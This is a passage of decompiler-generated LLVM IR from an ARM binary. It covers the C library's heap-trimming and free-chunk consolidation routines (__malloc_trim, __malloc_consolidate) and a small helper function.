  call void @__pseudo_branch(i32 %v4_1c448)
  br label %dec_label_pc_1c454

dec_label_pc_1c454:                               ; preds = %dec_label_pc_1c154, %dec_label_pc_1c0fc, %dec_label_pc_1c0e4, %dec_label_pc_1c438
  %v0_1c454 = load i32, i32* @r4, align 4
  store i32 %v0_1c454, i32* %r0.global-to-local, align 4
  store i32 %v3_1c0c4, i32* @r4, align 4
  store i32 %v6_1c0c4, i32* @r5, align 4
  store i32 %v9_1c0c4, i32* @r6, align 4
  store i32 %v12_1c0c4, i32* @r7, align 4
  store i32 %v15_1c0c4, i32* @r8, align 4
  store i32 %v18_1c0c4, i32* @sb, align 4
  store i32 %v21_1c0c4, i32* @sl, align 4
  store i32 %v24_1c0c4, i32* @fp, align 4
  store i32 %v27_1c0c4, i32* @lr, align 4
  ret i32 %v0_1c454

; uselistorder directives
  uselistorder i32 %v2_1c3ec, { 1, 0, 2 }
  uselistorder i32 %v2_1c3d4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c3b0, { 1, 0, 2 }
  uselistorder i32 %v3_1c390, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c334, { 2, 1, 0 }
  uselistorder i32 %v2_1c304, { 1, 0, 2 }
  uselistorder i32 %v0_1c298, { 1, 0 }
  uselistorder i32 %v1_1c254, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1c1b8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1c1b0, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1c194, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1c18c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1c188, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1c178, { 1, 0 }
  uselistorder i32 %v0_1c174, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1c14c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1c454, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c438, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1c364, { 1, 0 }
  uselistorder label %dec_label_pc_1c304, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1c250, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1c244, { 1, 0 }
  uselistorder label %dec_label_pc_1c240, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1c468(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c468:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1c468 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c468, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_1c468
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_1c47c.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c47c.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_1c480.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_1c468, %bb
  %v4_1c480 = phi i32 [ %v4_1c480.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_1c468 ], [ 0, %bb ]
  ret i32 %v4_1c480

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_1c484 = add i32 %arg2, 44
  %v2_1c484 = inttoptr i32 %v1_1c484 to i32*
  %v3_1c484 = load i32, i32* %v2_1c484, align 4
  %v12_1c488 = load i32, i32* @r7, align 4
  %v1_1c48c = add i32 %v3_1c484, 4
  %v2_1c48c = inttoptr i32 %v1_1c48c to i32*
  %v3_1c48c = load i32, i32* %v2_1c48c, align 4
  %v1_1c490 = add i32 %arg2, 860
  %v2_1c490 = inttoptr i32 %v1_1c490 to i32*
  %v3_1c490 = load i32, i32* %v2_1c490, align 4
  store i32 %v3_1c490, i32* @r4, align 4
  %v1_1c494 = and i32 %v3_1c48c, -4
  store i32 %v1_1c494, i32* @r6, align 4
  %v1_1c498 = add i32 %v1_1c494, -17
  %v2_1c49c = add i32 %v1_1c498, %v3_1c490
  store i32 %arg2, i32* @r5, align 4
  %v2_1c4a8 = sub i32 %v2_1c49c, %arg1
  store i32 %v3_1c490, i32* %r1.global-to-local, align 4
  %v2_1c4b0 = udiv i32 %v2_1c4a8, %v3_1c490
  %v1_1c4b4 = add i32 %v2_1c4b0, -1
  store i32 %v1_1c4b4, i32* %r0.global-to-local, align 4
  %v2_1c4b8 = mul i32 %v1_1c4b4, %v3_1c490
  store i32 %v2_1c4b8, i32* @r7, align 4
  %tmp8 = icmp slt i32 %v2_1c4b8, 1
  br i1 %tmp8, label %dec_label_pc_1c524, label %dec_label_pc_1c4c4

dec_label_pc_1c4c4:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1c4c8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1c4c8, i32* %r0.global-to-local, align 4
  %v0_1c4cc = load i32, i32* @r5, align 4
  %v1_1c4cc = add i32 %v0_1c4cc, 44
  %v2_1c4cc = inttoptr i32 %v1_1c4cc to i32*
  %v3_1c4cc = load i32, i32* %v2_1c4cc, align 4
  %v0_1c4d0 = load i32, i32* @r6, align 4
  %v2_1c4d0 = add i32 %v0_1c4d0, %v3_1c4cc
  %v9_1c4d4 = icmp eq i32 %v1_1c4c8, %v2_1c4d0
  store i32 %v1_1c4c8, i32* @r4, align 4
  br i1 %v9_1c4d4, label %dec_label_pc_1c4e0, label %dec_label_pc_1c524

dec_label_pc_1c4e0:                               ; preds = %dec_label_pc_1c4c4
  %v0_1c4e0 = load i32, i32* @r7, align 4
  %v1_1c4e0 = sub i32 0, %v0_1c4e0
  store i32 %v1_1c4e0, i32* %r0.global-to-local, align 4
  %v1_1c4e4 = call i32 @__GI_sbrk(i32 %v1_1c4e0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1c4ec = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1c4ec, i32* %r0.global-to-local, align 4
  %v7_1c4f0 = icmp eq i32 %v1_1c4ec, -1
  br i1 %v7_1c4f0, label %dec_label_pc_1c524, label %dec_label_pc_1c4f8

dec_label_pc_1c4f8:                               ; preds = %dec_label_pc_1c4e0
  %v0_1c4f8 = load i32, i32* @r4, align 4
  %v2_1c4f8 = sub i32 %v0_1c4f8, %v1_1c4ec
  store i32 %v2_1c4f8, i32* %r0.global-to-local, align 4
  %v9_1c4f8 = icmp eq i32 %v0_1c4f8, %v1_1c4ec
  br i1 %v9_1c4f8, label %dec_label_pc_1c524, label %dec_label_pc_1c500

dec_label_pc_1c500:                               ; preds = %dec_label_pc_1c4f8
  %v0_1c500 = load i32, i32* @r5, align 4
  %v1_1c500 = add i32 %v0_1c500, 872
  %v2_1c500 = inttoptr i32 %v1_1c500 to i32*
  %v3_1c500 = load i32, i32* %v2_1c500, align 4
  %v1_1c504 = load i32, i32* @r6, align 4
  %v2_1c504 = sub i32 %v1_1c504, %v2_1c4f8
  store i32 %v2_1c504, i32* %r2.global-to-local, align 4
  %v1_1c508 = add i32 %v0_1c500, 44
  %v2_1c508 = inttoptr i32 %v1_1c508 to i32*
  %v3_1c508 = load i32, i32* %v2_1c508, align 4
  store i32 %v3_1c508, i32* %r1.global-to-local, align 4
  %v2_1c50c = sub i32 %v3_1c500, %v2_1c4f8
  %v1_1c510 = or i32 %v2_1c504, 1
  store i32 %v1_1c510, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1c50c, i32* %v2_1c500, align 4
  %v0_1c51c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c51c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c51c = add i32 %v1_1c51c, 4
  %v3_1c51c = inttoptr i32 %v2_1c51c to i32*
  store i32 %v0_1c51c, i32* %v3_1c51c, align 4
  %v1_1c530.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c528

dec_label_pc_1c524:                               ; preds = %dec_label_pc_1c4c4, %dec_label_pc_1c4f8, %dec_label_pc_1c4e0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c528

dec_label_pc_1c528:                               ; preds = %dec_label_pc_1c500, %dec_label_pc_1c524
  %v1_1c530 = phi i32 [ %v1_1c530.pre, %dec_label_pc_1c500 ], [ 0, %dec_label_pc_1c524 ]
  store i32 %v12_1c488, i32* @r7, align 4
  ret i32 %v1_1c530

; uselistorder directives
  uselistorder i32 %v1_1c4ec, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1c490, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1c528, { 1, 0 }
  uselistorder label %dec_label_pc_1c524, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1c534 = load i32, i32* @r4, align 4
  store i32 %v3_1c534, i32* %stack_var_-36, align 4
  %v0_1c538 = load i32, i32* @r0, align 4
  %v1_1c538 = inttoptr i32 %v0_1c538 to i32*
  %v2_1c538 = load i32, i32* %v1_1c538, align 4
  store i32 %v2_1c538, i32* %r3.global-to-local, align 4
  %v2_1c53c = icmp eq i32 %v2_1c538, 0
  store i32 %v0_1c538, i32* @r4, align 4
  br i1 %v2_1c53c, label %dec_label_pc_1c674.preheader, label %dec_label_pc_1c550

dec_label_pc_1c674.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1c67c25 = add i32 %v0_1c538, 52
  store i32 %v1_1c67c25, i32* %r3.global-to-local, align 4
  %v2_1c68426 = add i32 %v0_1c538, 60
  %v3_1c68427 = inttoptr i32 %v2_1c68426 to i32*
  store i32 %v1_1c67c25, i32* %v3_1c68427, align 4
  %v0_1c68828 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c68829 = add i32 %v0_1c68828, 12
  %v3_1c68830 = inttoptr i32 %v2_1c68829 to i32*
  store i32 %v0_1c68828, i32* %v3_1c68830, align 4
  br label %dec_label_pc_1c674.dec_label_pc_1c674_crit_edge

dec_label_pc_1c550:                               ; preds = %entry
  %v1_1c550 = and i32 %v2_1c538, -3
  %v3_1c554 = udiv i32 %v2_1c538, 8
  store i32 %v3_1c554, i32* %r2.global-to-local, align 4
  store i32 %v1_1c550, i32* %v1_1c538, align 4
  %v0_1c55c = load i32, i32* @r0, align 4
  %v1_1c55c = add i32 %v0_1c55c, -4
  store i32 %v1_1c55c, i32* %r3.global-to-local, align 4
  %v1_1c560 = load i32, i32* %r2.global-to-local, align 4
  %v4_1c560 = mul i32 %v1_1c560, 4
  %v5_1c560 = add i32 %v4_1c560, %v1_1c55c
  store i32 %v5_1c560, i32* %sb.global-to-local, align 4
  %v1_1c564 = add i32 %v0_1c55c, 52
  store i32 %v1_1c564, i32* %r7.global-to-local, align 4
  %v1_1c568 = add i32 %v0_1c55c, 4
  store i32 %v1_1c568, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1c570

dec_label_pc_1c570:                               ; preds = %dec_label_pc_1c66c, %dec_label_pc_1c550
  %v1_1c66410 = phi i32 [ %v1_1c664, %dec_label_pc_1c66c ], [ %v5_1c560, %dec_label_pc_1c550 ]
  %v1_1c57c = phi i32 [ %v1_1c66c, %dec_label_pc_1c66c ], [ %v1_1c568, %dec_label_pc_1c550 ]
  %v1_1c570 = inttoptr i32 %v1_1c57c to i32*
  %v2_1c570 = load i32, i32* %v1_1c570, align 4
  store i32 %v2_1c570, i32* %r1.global-to-local, align 4
  %v2_1c574 = icmp eq i32 %v2_1c570, 0
  br i1 %v2_1c574, label %dec_label_pc_1c664, label %dec_label_pc_1c57c

dec_label_pc_1c57c:                               ; preds = %dec_label_pc_1c570
  %v0_1c57c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1c57c, i32* %v1_1c570, align 4
  %v0_1c580.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c580

dec_label_pc_1c580:                               ; preds = %dec_label_pc_1c658, %dec_label_pc_1c57c
  %v0_1c59c = phi i32 [ %v0_1c658, %dec_label_pc_1c658 ], [ %v0_1c580.pre, %dec_label_pc_1c57c ]
  %v1_1c580 = add i32 %v0_1c59c, 4
  %v2_1c580 = inttoptr i32 %v1_1c580 to i32*
  %v3_1c580 = load i32, i32* %v2_1c580, align 4
  store i32 %v3_1c580, i32* %r3.global-to-local, align 4
  %v1_1c584 = and i32 %v3_1c580, -2
  store i32 %v1_1c584, i32* %lr.global-to-local, align 4
  %v2_1c588 = add i32 %v1_1c584, %v0_1c59c
  store i32 %v2_1c588, i32* @r0, align 4
  %v1_1c58c = urem i32 %v3_1c580, 2
  %v2_1c58c = icmp eq i32 %v1_1c58c, 0
  %v1_1c590 = add i32 %v0_1c59c, 8
  %v2_1c590 = inttoptr i32 %v1_1c590 to i32*
  %v3_1c590 = load i32, i32* %v2_1c590, align 4
  store i32 %v3_1c590, i32* %sl.global-to-local, align 4
  %v1_1c594 = add i32 %v2_1c588, 4
  %v2_1c594 = inttoptr i32 %v1_1c594 to i32*
  %v3_1c594 = load i32, i32* %v2_1c594, align 4
  store i32 %v3_1c594, i32* %r8.global-to-local, align 4
  br i1 %v2_1c58c, label %dec_label_pc_1c59c, label %dec_label_pc_1c5d0

dec_label_pc_1c59c:                               ; preds = %dec_label_pc_1c580
  %v1_1c59c = inttoptr i32 %v0_1c59c to i32*
  %v2_1c59c = load i32, i32* %v1_1c59c, align 4
  store i32 %v2_1c59c, i32* %r5.global-to-local, align 4
  %v2_1c5a0 = sub i32 %v0_1c59c, %v2_1c59c
  store i32 %v2_1c5a0, i32* %r3.global-to-local, align 4
  %v1_1c5a4 = add i32 %v2_1c5a0, 8
  %v2_1c5a4 = inttoptr i32 %v1_1c5a4 to i32*
  %v3_1c5a4 = load i32, i32* %v2_1c5a4, align 4
  store i32 %v3_1c5a4, i32* %ip.global-to-local, align 4
  %v1_1c5a8 = add i32 %v3_1c5a4, 12
  %v2_1c5a8 = inttoptr i32 %v1_1c5a8 to i32*
  %v3_1c5a8 = load i32, i32* %v2_1c5a8, align 4
  store i32 %v3_1c5a8, i32* %r1.global-to-local, align 4
  %v9_1c5ac = icmp eq i32 %v3_1c5a8, %v2_1c5a0
  %v1_1c5b0 = add i32 %v2_1c5a0, 12
  %v2_1c5b0 = inttoptr i32 %v1_1c5b0 to i32*
  %v3_1c5b0 = load i32, i32* %v2_1c5b0, align 4
  store i32 %v3_1c5b0, i32* %r2.global-to-local, align 4
  br i1 %v9_1c5ac, label %dec_label_pc_1c5b8, label %dec_label_pc_1c614

dec_label_pc_1c5b8:                               ; preds = %dec_label_pc_1c59c
  %v1_1c5b8 = add i32 %v3_1c5b0, 8
  %v2_1c5b8 = inttoptr i32 %v1_1c5b8 to i32*
  %v3_1c5b8 = load i32, i32* %v2_1c5b8, align 4
  store i32 %v3_1c5b8, i32* %r3.global-to-local, align 4
  %v9_1c5bc = icmp eq i32 %v3_1c5b8, %v2_1c5a0
  br i1 %v9_1c5bc, label %dec_label_pc_1c5c4, label %dec_label_pc_1c614

dec_label_pc_1c5c4:                               ; preds = %dec_label_pc_1c5b8
  store i32 %v3_1c5a4, i32* %v2_1c5b8, align 4
  %v0_1c5c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c5c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c5c8 = add i32 %v1_1c5c8, 12
  %v3_1c5c8 = inttoptr i32 %v2_1c5c8 to i32*
  store i32 %v0_1c5c8, i32* %v3_1c5c8, align 4
  %v0_1c5cc = load i32, i32* %lr.global-to-local, align 4
  %v1_1c5cc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5cc = add i32 %v1_1c5cc, %v0_1c5cc
  store i32 %v2_1c5cc, i32* %lr.global-to-local, align 4
  %v0_1c5d4.pre = load i32, i32* @r0, align 4
  %v0_1c5d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c5d0

dec_label_pc_1c5d0:                               ; preds = %dec_label_pc_1c580, %dec_label_pc_1c5c4
  %v0_1c648 = phi i32 [ %v1_1c584, %dec_label_pc_1c580 ], [ %v2_1c5cc, %dec_label_pc_1c5c4 ]
  %v0_1c5d8 = phi i32 [ %v3_1c594, %dec_label_pc_1c580 ], [ %v0_1c5d8.pre, %dec_label_pc_1c5c4 ]
  %v1_1c5ec = phi i32 [ %v2_1c588, %dec_label_pc_1c580 ], [ %v0_1c5d4.pre, %dec_label_pc_1c5c4 ]
  %v0_1c5d0 = load i32, i32* @r4, align 4
  %v1_1c5d0 = add i32 %v0_1c5d0, 44
  %v2_1c5d0 = inttoptr i32 %v1_1c5d0 to i32*
  %v3_1c5d0 = load i32, i32* %v2_1c5d0, align 4
  store i32 %v3_1c5d0, i32* %r3.global-to-local, align 4
  %v9_1c5d4 = icmp eq i32 %v1_1c5ec, %v3_1c5d0
  %v1_1c5d8 = and i32 %v0_1c5d8, -4
  store i32 %v1_1c5d8, i32* %r5.global-to-local, align 4
  br i1 %v9_1c5d4, label %dec_label_pc_1c648, label %dec_label_pc_1c5e0

dec_label_pc_1c5e0:                               ; preds = %dec_label_pc_1c5d0
  %v2_1c5e0 = add i32 %v1_1c5ec, %v1_1c5d8
  store i32 %v2_1c5e0, i32* %r3.global-to-local, align 4
  %v1_1c5e4 = add i32 %v2_1c5e0, 4
  %v2_1c5e4 = inttoptr i32 %v1_1c5e4 to i32*
  %v3_1c5e4 = load i32, i32* %v2_1c5e4, align 4
  store i32 %v3_1c5e4, i32* %r3.global-to-local, align 4
  %v1_1c5e8 = urem i32 %v3_1c5e4, 2
  %v2_1c5e8 = icmp eq i32 %v1_1c5e8, 0
  %v2_1c5ec = add i32 %v1_1c5ec, 4
  %v3_1c5ec = inttoptr i32 %v2_1c5ec to i32*
  store i32 %v1_1c5d8, i32* %v3_1c5ec, align 4
  br i1 %v2_1c5e8, label %dec_label_pc_1c5f4, label %dec_label_pc_1c5e0.dec_label_pc_1c624_crit_edge

dec_label_pc_1c5e0.dec_label_pc_1c624_crit_edge:  ; preds = %dec_label_pc_1c5e0
  %v0_1c628.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1c624

dec_label_pc_1c5f4:                               ; preds = %dec_label_pc_1c5e0
  %v0_1c5f4 = load i32, i32* @r0, align 4
  %v1_1c5f4 = add i32 %v0_1c5f4, 8
  %v2_1c5f4 = inttoptr i32 %v1_1c5f4 to i32*
  %v3_1c5f4 = load i32, i32* %v2_1c5f4, align 4
  store i32 %v3_1c5f4, i32* %ip.global-to-local, align 4
  %v1_1c5f8 = add i32 %v3_1c5f4, 12
  %v2_1c5f8 = inttoptr i32 %v1_1c5f8 to i32*
  %v3_1c5f8 = load i32, i32* %v2_1c5f8, align 4
  store i32 %v3_1c5f8, i32* %r3.global-to-local, align 4
  %v9_1c5fc = icmp eq i32 %v3_1c5f8, %v0_1c5f4
  %v1_1c600 = add i32 %v0_1c5f4, 12
  %v2_1c600 = inttoptr i32 %v1_1c600 to i32*
  %v3_1c600 = load i32, i32* %v2_1c600, align 4
  store i32 %v3_1c600, i32* %r2.global-to-local, align 4
  br i1 %v9_1c5fc, label %dec_label_pc_1c608, label %dec_label_pc_1c614

dec_label_pc_1c608:                               ; preds = %dec_label_pc_1c5f4
  %v1_1c608 = add i32 %v3_1c600, 8
  %v2_1c608 = inttoptr i32 %v1_1c608 to i32*
  %v3_1c608 = load i32, i32* %v2_1c608, align 4
  store i32 %v3_1c608, i32* %r3.global-to-local, align 4
  %v9_1c60c = icmp eq i32 %v3_1c608, %v0_1c5f4
  br i1 %v9_1c60c, label %dec_label_pc_1c618, label %dec_label_pc_1c614

dec_label_pc_1c614:                               ; preds = %dec_label_pc_1c5f4, %dec_label_pc_1c5b8, %dec_label_pc_1c59c, %dec_label_pc_1c608
  %v0_1c614 = call i32 @abort()
  store i32 %v0_1c614, i32* @r0, align 4
  %v0_1c618.pre = load i32, i32* @ip, align 4
  %v1_1c618.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1c618

dec_label_pc_1c618:                               ; preds = %dec_label_pc_1c608, %dec_label_pc_1c614
  %v1_1c618 = phi i32 [ %v3_1c600, %dec_label_pc_1c608 ], [ %v1_1c618.pre, %dec_label_pc_1c614 ]
  %v0_1c618 = phi i32 [ %v3_1c5f4, %dec_label_pc_1c608 ], [ %v0_1c618.pre, %dec_label_pc_1c614 ]
  %v2_1c618 = add i32 %v1_1c618, 8
  %v3_1c618 = inttoptr i32 %v2_1c618 to i32*
  store i32 %v0_1c618, i32* %v3_1c618, align 4
  %v0_1c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c61c = load i32, i32* %ip.global-to-local, align 4
  %v2_1c61c = add i32 %v1_1c61c, 12
  %v3_1c61c = inttoptr i32 %v2_1c61c to i32*
  store i32 %v0_1c61c, i32* %v3_1c61c, align 4
  %v0_1c620 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c620 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c620 = add i32 %v1_1c620, %v0_1c620
  store i32 %v2_1c620, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1c624

dec_label_pc_1c624:                               ; preds = %dec_label_pc_1c5e0.dec_label_pc_1c624_crit_edge, %dec_label_pc_1c618
  %v0_1c628 = phi i32 [ %v0_1c628.pre, %dec_label_pc_1c5e0.dec_label_pc_1c624_crit_edge ], [ %v2_1c620, %dec_label_pc_1c618 ]
  %v0_1c624 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c624 = add i32 %v0_1c624, 8
  %v2_1c624 = inttoptr i32 %v1_1c624 to i32*
  %v3_1c624 = load i32, i32* %v2_1c624, align 4
  store i32 %v3_1c624, i32* %r2.global-to-local, align 4
  %v1_1c628 = or i32 %v0_1c628, 1
  store i32 %v1_1c628, i32* %r3.global-to-local, align 4
  %v0_1c62c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1c62c, i32* %v2_1c624, align 4
  %v0_1c630 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c630 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c630 = add i32 %v1_1c630, 12
  %v3_1c630 = inttoptr i32 %v2_1c630 to i32*
  store i32 %v0_1c630, i32* %v3_1c630, align 4
  %v0_1c634 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c634 = add i32 %v1_1c634, %v0_1c634
  %v4_1c634 = inttoptr i32 %v3_1c634 to i32*
  store i32 %v0_1c634, i32* %v4_1c634, align 4
  %v0_1c638 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c638 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c638 = add i32 %v1_1c638, 4
  %v3_1c638 = inttoptr i32 %v2_1c638 to i32*
  store i32 %v0_1c638, i32* %v3_1c638, align 4
  %v0_1c63c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c63c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c63c = add i32 %v1_1c63c, 8
  %v3_1c63c = inttoptr i32 %v2_1c63c to i32*
  store i32 %v0_1c63c, i32* %v3_1c63c, align 4
  %v0_1c640 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c640 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c640 = add i32 %v1_1c640, 12
  %v3_1c640 = inttoptr i32 %v2_1c640 to i32*
  store i32 %v0_1c640, i32* %v3_1c640, align 4
  br label %dec_label_pc_1c658

dec_label_pc_1c648:                               ; preds = %dec_label_pc_1c5d0
  %v2_1c648 = add i32 %v1_1c5d8, %v0_1c648
  %v1_1c64c = or i32 %v2_1c648, 1
  store i32 %v1_1c64c, i32* %r3.global-to-local, align 4
  %v1_1c650 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c650 = add i32 %v1_1c650, 4
  %v3_1c650 = inttoptr i32 %v2_1c650 to i32*
  store i32 %v1_1c64c, i32* %v3_1c650, align 4
  %v0_1c654 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c654 = load i32, i32* @r4, align 4
  %v2_1c654 = add i32 %v1_1c654, 44
  %v3_1c654 = inttoptr i32 %v2_1c654 to i32*
  store i32 %v0_1c654, i32* %v3_1c654, align 4
  br label %dec_label_pc_1c658

dec_label_pc_1c658:                               ; preds = %dec_label_pc_1c624, %dec_label_pc_1c648
  %v0_1c658 = load i32, i32* %sl.global-to-local, align 4
  %v2_1c658 = icmp eq i32 %v0_1c658, 0
  store i32 %v0_1c658, i32* %r1.global-to-local, align 4
  br i1 %v2_1c658, label %dec_label_pc_1c664.loopexit, label %dec_label_pc_1c580

dec_label_pc_1c664.loopexit:                      ; preds = %dec_label_pc_1c658
  %v0_1c664.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_1c664.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1c664

dec_label_pc_1c664:                               ; preds = %dec_label_pc_1c664.loopexit, %dec_label_pc_1c570
  %v1_1c664 = phi i32 [ %v1_1c664.pre, %dec_label_pc_1c664.loopexit ], [ %v1_1c66410, %dec_label_pc_1c570 ]
  %v0_1c66c = phi i32 [ %v0_1c664.pre, %dec_label_pc_1c664.loopexit ], [ %v1_1c57c, %dec_label_pc_1c570 ]
  %v9_1c664 = icmp eq i32 %v0_1c66c, %v1_1c664
  br i1 %v9_1c664, label %dec_label_pc_1c6dc, label %dec_label_pc_1c66c

dec_label_pc_1c66c:                               ; preds = %dec_label_pc_1c664
  %v1_1c66c = add i32 %v0_1c66c, 4
  store i32 %v1_1c66c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c570

dec_label_pc_1c674.dec_label_pc_1c674_crit_edge:  ; preds = %dec_label_pc_1c674.preheader, %dec_label_pc_1c674.dec_label_pc_1c674_crit_edge
  %v0_1c674.pre = load i32, i32* @r4, align 4
  %v1_1c674.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_1c674 = mul i32 %v1_1c674.pre, 8
  %v5_1c674 = add i32 %v4_1c674, %v0_1c674.pre
  %v1_1c678 = add i32 %v1_1c674.pre, 1
  store i32 %v1_1c678, i32* %r2.global-to-local, align 4
  %v1_1c67c = add i32 %v5_1c674, 44
  store i32 %v1_1c67c, i32* %r3.global-to-local, align 4
  %v2_1c684 = add i32 %v5_1c674, 52
  %v3_1c684 = inttoptr i32 %v2_1c684 to i32*
  store i32 %v1_1c67c, i32* %v3_1c684, align 4
  %v0_1c688 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c688 = add i32 %v0_1c688, 12
  %v3_1c688 = inttoptr i32 %v2_1c688 to i32*
  store i32 %v0_1c688, i32* %v3_1c688, align 4
  %v7_1c68c = icmp sgt i32 %v1_1c678, 95
  br i1 %v7_1c68c, label %dec_label_pc_1c690, label %dec_label_pc_1c674.dec_label_pc_1c674_crit_edge

dec_label_pc_1c690:                               ; preds = %dec_label_pc_1c674.dec_label_pc_1c674_crit_edge
  %v0_1c690 = load i32, i32* @r4, align 4
  %v1_1c690 = inttoptr i32 %v0_1c690 to i32*
  %v2_1c690 = load i32, i32* %v1_1c690, align 4
  store i32 %v2_1c690, i32* %r2.global-to-local, align 4
  %v1_1c694 = add i32 %v0_1c690, 864
